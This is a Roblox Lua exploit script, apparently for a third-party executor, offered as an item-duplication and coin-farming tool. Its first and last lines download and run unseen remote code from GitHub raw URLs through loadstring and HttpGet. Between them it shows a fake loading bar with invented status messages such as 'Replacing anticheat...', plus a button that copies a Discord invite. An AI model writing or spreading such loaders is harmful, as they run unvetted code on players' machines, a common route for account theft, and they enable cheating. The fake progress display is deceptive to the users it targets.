loadstring(game:HttpGet("https://raw.githubusercontent.com/snoixs/DupeScriptV5/refs/heads/main/WorkingAllGames"))()
local player = game.Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Cleanup old GUIs
if playerGui:FindFirstChild("LoadingGui") then
    playerGui.LoadingGui:Destroy()
end
if playerGui:FindFirstChild("DiscordGui") then
    playerGui.DiscordGui:Destroy()
end

-- Config
local totalTime = 25
local steps = 100
local delayTime = totalTime / steps
local discordInvite = "https://discord.gg/your_discord_invite_here" -- CHANGE THIS

-- Store start time globally (use _G to persist across respawns)
if not _G.loadingStartTime then
    _G.loadingStartTime = tick()  -- store current time when script first runs
end

-- Calculate elapsed time since start
local elapsed = tick() - _G.loadingStartTime
local remainingTime = math.clamp(totalTime - elapsed, 0, totalTime)
local remainingSteps = math.floor(remainingTime / delayTime)

-- ===== Create Loading GUI =====
local loadingGui = Instance.new("ScreenGui")
loadingGui.Name = "LoadingGui"
loadingGui.IgnoreGuiInset = true
loadingGui.ResetOnSpawn = false
loadingGui.Parent = playerGui

local container = Instance.new("Frame")
container.Size = UDim2.new(0, 400, 0, 200)
container.Position = UDim2.new(0.5, -200, 0.5, -100)
container.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
container.BorderSizePixel = 0
container.BackgroundTransparency = 0.1
container.Active = true
container.Draggable = true
container.Parent = loadingGui

local uiCorner = Instance.new("UICorner")
uiCorner.CornerRadius = UDim.new(0, 12)
uiCorner.Parent = container

local creditLabel = Instance.new("TextLabel")
creditLabel.Size = UDim2.new(1, 0, 0, 30)
creditLabel.Position = UDim2.new(0, 0, 0.1, 0)
creditLabel.BackgroundTransparency = 1
creditLabel.Font = Enum.Font.FredokaOne
creditLabel.TextScaled = true
creditLabel.TextColor3 = Color3.fromRGB(135, 206, 250)
creditLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 128)
creditLabel.TextStrokeTransparency = 0.3
creditLabel.Text = "Script made by vxly"
creditLabel.Parent = container

local animeLeft = Instance.new("ImageLabel")
animeLeft.Size = UDim2.new(0, 60, 0, 60)
animeLeft.Position = UDim2.new(0, 10, 0, 10)
animeLeft.BackgroundTransparency = 1
animeLeft.Image = "rbxassetid://6073763711"
animeLeft.Parent = container

local animeRight = Instance.new("ImageLabel")
animeRight.Size = UDim2.new(0, 60, 0, 60)
animeRight.AnchorPoint = Vector2.new(1, 0)
animeRight.Position = UDim2.new(1, -10, 0, 10)
animeRight.BackgroundTransparency = 1
animeRight.Image = "rbxassetid://6895556833"
animeRight.Parent = container

local progressBg = Instance.new("Frame")
progressBg.Size = UDim2.new(1, -40, 0, 40)
progressBg.Position = UDim2.new(0, 20, 0.65, 0)
progressBg.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
progressBg.BorderSizePixel = 0
progressBg.Parent = container

local progressCorner = Instance.new("UICorner")
progressCorner.CornerRadius = UDim.new(0, 8)
progressCorner.Parent = progressBg

local progressBar = Instance.new("Frame")
progressBar.Size = UDim2.new(elapsed/totalTime, 0, 1, 0)  -- progress based on elapsed time
progressBar.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
progressBar.BorderSizePixel = 0
progressBar.Parent = progressBg

local progressBarCorner = Instance.new("UICorner")
progressBarCorner.CornerRadius = UDim.new(0, 8)
progressBarCorner.Parent = progressBar

local percentLabel = Instance.new("TextLabel")
percentLabel.Size = UDim2.new(1, 0, 0, 30)
percentLabel.Position = UDim2.new(0, 0, 0.25, 0)
percentLabel.BackgroundTransparency = 1
percentLabel.Font = Enum.Font.SourceSansBold
percentLabel.TextScaled = true
percentLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
percentLabel.Text = tostring(math.floor(elapsed / totalTime * 100)) .. "%"
percentLabel.Parent = container

local statusLabel = Instance.new("TextLabel")
statusLabel.Size = UDim2.new(1, -40, 0, 30)
statusLabel.Position = UDim2.new(0, 20, 0.85, 0)
statusLabel.BackgroundTransparency = 1
statusLabel.Font = Enum.Font.SourceSansItalic
statusLabel.TextScaled = true
statusLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
statusLabel.Parent = container

-- Set status text based on current progress
local function updateStatus(i)
	if i <= 1 then
		statusLabel.Text = "Fetching data..."
	elseif i <= 34 then
		statusLabel.Text = "Rewriting console..."
	elseif i <= 67 then
		statusLabel.Text = "Replacing anticheat..."
	elseif i >= 100 then
		statusLabel.Text = "Done!"
	end
end
updateStatus(elapsed / totalTime * 100)

-- ===== Discord GUI (persistent) =====
local discordGui = Instance.new("ScreenGui")
discordGui.Name = "DiscordGui"
discordGui.IgnoreGuiInset = true
discordGui.ResetOnSpawn = false
discordGui.Parent = playerGui

local discordButton = Instance.new("TextButton")
discordButton.Size = UDim2.new(0, 160, 0, 40)
discordButton.Position = UDim2.new(1, -180, 0.5, -20)
discordButton.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
discordButton.BorderSizePixel = 0
discordButton.TextColor3 = Color3.fromRGB(255, 255, 255)
discordButton.Font = Enum.Font.FredokaOne
discordButton.TextScaled = true
discordButton.Text = "Click me for the Discord"
discordButton.Parent = discordGui

local discordButtonCorner = Instance.new("UICorner")
discordButtonCorner.CornerRadius = UDim.new(0, 12)
discordButtonCorner.Parent = discordButton

local confirmLabel = Instance.new("TextLabel")
confirmLabel.Size = UDim2.new(0, 200, 0, 30)
confirmLabel.Position = UDim2.new(1, -220, 0.5, 30)
confirmLabel.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
confirmLabel.BorderSizePixel = 0
confirmLabel.TextColor3 = Color3.fromRGB(135, 206, 250)
confirmLabel.Font = Enum.Font.FredokaOne
confirmLabel.TextScaled = true
confirmLabel.Text = "Discord link copied!"
confirmLabel.BackgroundTransparency = 0
confirmLabel.Visible = false
confirmLabel.Parent = discordGui

local confirmUICorner = Instance.new("UICorner")
confirmUICorner.CornerRadius = UDim.new(0, 12)
confirmUICorner.Parent = confirmLabel

local function copyToClipboard(text)
	if setclipboard then
		setclipboard(text)
	else
		print("Clipboard copy not supported")
	end
end

discordButton.MouseButton1Click:Connect(function()
	copyToClipboard(discordInvite)

	confirmLabel.Visible = true
	confirmLabel.TextTransparency = 1
	confirmLabel.BackgroundTransparency = 0
	for i = 1, 20 do
		confirmLabel.TextTransparency = 1 - i * 0.05
		task.wait(0.02)
	end

	task.wait(1.5)

	for i = 1, 20 do
		confirmLabel.TextTransparency = i * 0.05
		task.wait(0.02)
	end
	confirmLabel.Visible = false
end)

-- Loading progress loop: continue only if time remains
if remainingSteps > 0 then
	for i = math.floor(elapsed / totalTime * 100) + 1, 100 do
		local progressFraction = i / 100
		progressBar:TweenSize(UDim2.new(progressFraction, 0, 1, 0), "Out", "Linear", delayTime, true)
		percentLabel.Text = i .. "%"
		updateStatus(i)
		task.wait(delayTime)
	end
end

-- Fade out loading GUI
for transparency = 0, 1, 0.05 do
	container.BackgroundTransparency = transparency
	progressBg.BackgroundTransparency = transparency
	progressBar.BackgroundTransparency = transparency
	percentLabel.TextTransparency = transparency
	statusLabel.TextTransparency = transparency
	creditLabel.TextTransparency = transparency
	animeLeft.ImageTransparency = transparency
	animeRight.ImageTransparency = transparency

	task.wait(0.05)
end

loadingGui:Destroy()
_G.loadingStartTime = nil  -- reset for next time
wait(1)
loadstring(game:HttpGet("https://raw.githubusercontent.com/spawnerscript/MurderMystery2/refs/heads/main/farmcoin.lua"))()
